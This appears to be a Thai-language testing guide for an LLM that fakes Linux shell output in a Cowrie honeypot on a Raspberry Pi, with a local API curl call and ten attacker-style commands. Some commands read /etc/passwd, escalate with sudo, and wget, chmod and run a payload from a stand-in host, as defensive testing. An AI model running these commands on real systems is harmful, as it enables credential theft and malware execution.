> **Safety notice — historical guide.**
>
> This guide is not an authorization to download or execute payloads. The current project policy is hash/metadata-only and forbids malware execution on the Pi; see [Security and malware policy](SECURITY-AND-MALWARE-POLICY.md). Use benign commands and the Cowrie listener defined in the current service catalog.
>
# คู่มือการทดสอบ AI Deception Model (Hailo LLM) ด้วยตัวเอง

เอกสารนี้รวบรวมชุดคำสั่งและวิธีการทดสอบโมเดล **Qwen2-1.5B+LoRA** ที่รันอยู่บนชิป **Hailo AI HAT+** เพื่อจำลองการตอบสนองของระบบ Honeypot ครับ

---

## วิธีที่ 1: ทดสอบยิง API ตรงๆ ผ่าน `curl` (แบบที่บอทใช้ทดสอบ)
คุณสามารถก๊อปปี้คำสั่ง `curl` ด้านล่างนี้ไปแปะใน Terminal ของบอร์ด Raspberry Pi เพื่อดูการทำงานดิบๆ ของ AI ได้เลยครับ (สังเกตความไวในการตอบกลับ)

```bash
curl -X POST http://127.0.0.1:8100/generate \
     -H "Content-Type: application/json" \
     -d '{
           "cwd": "/home/ubuntu",
           "files_str": "bot.py config.json data.db",
           "attacker_type": "script_kiddie",
           "kill_chain_phase": "execution",
           "mode": "bash",
           "action": "execute",
           "user_command": "whoami",
           "stage": "A",
           "tier": 1
         }'
```
*(เปลี่ยนตรง `"user_command": "whoami"` เป็นคำสั่งอื่นๆ ที่ต้องการทดสอบได้เลยครับ)*

---

## วิธีที่ 2: ทดสอบด้วยตัวเองผ่านการ SSH เข้า Honeypot (สมจริงที่สุด)
ถ้าคุณเชื่อมต่อระบบ Cowrie เข้ากับโมเดลนี้แล้ว คุณสามารถ SSH เข้าพอร์ตของ Honeypot (ปกติคือพอร์ต `2222` หรือพอร์ตที่ตั้งไว้) แล้วลองพิมพ์คำสั่งพวกนี้ทีละบรรทัดเหมือนแฮกเกอร์จริงๆ ได้เลยครับ:

### 🎯 10 คำสั่งยอดฮิตสำหรับทดสอบความฉลาดของ AI

1. **เช็คสิทธิ์ตัวเอง:**
   ```bash
   whoami
   ```
2. **ดูข้อมูลระบบปฏิบัติการ:**
   ```bash
   uname -a
   ```
3. **ลิสต์ไฟล์ในเครื่อง (ดูว่า AI หลอกว่ามีไฟล์อะไรบ้าง):**
   ```bash
   ls -la
   ```
4. **พยายามขโมยไฟล์รหัสผ่าน (คำสั่งนี้ AI จะต้องแต่งไฟล์ปลอมยาวๆ ออกมา):**
   ```bash
   cat /etc/passwd
   ```
5. **ดาวน์โหลดมัลแวร์จากอินเทอร์เน็ต:**
   ```bash
   wget http://malware.local/payload.sh
   ```
6. **เปลี่ยนสิทธิ์ให้มัลแวร์รันได้:**
   ```bash
   chmod +x payload.sh
   ```
7. **รันมัลแวร์:**
   ```bash
   ./payload.sh
   ```
8. **เช็ค IP ของเครื่อง (พยายามดูว่าซ่อนอยู่หลัง Proxy ไหม):**
   ```bash
   curl ifconfig.me
   ```
9. **ขอดูประวัติคำสั่งเก่าๆ ของ Admin:**
   ```bash
   history
   ```
10. **พยายามยกระดับสิทธิ์ตัวเองเป็น Root:**
    ```bash
    sudo su
    ```

---
💡 **จุดที่น่าสังเกตตอนทดสอบ:**
- ลองดูว่าเวลาคุณสั่ง `cat` หรือ `wget` AI ตอบสนองได้เนียนเหมือน Linux ของจริงแค่ไหน
- สังเกตความหน่วง (Delay) ของคำสั่งสั้นๆ เทียบกับคำสั่งยาวๆ 
- ลองพิมพ์คำสั่งผิดๆ (Typos) เช่น `sl` หรือ `ifconfgi` ดูครับ AI ที่ถูกเทรนมาดีจะสามารถแกล้งพิมพ์ Error กลับมาได้เหมือนจริงครับ!
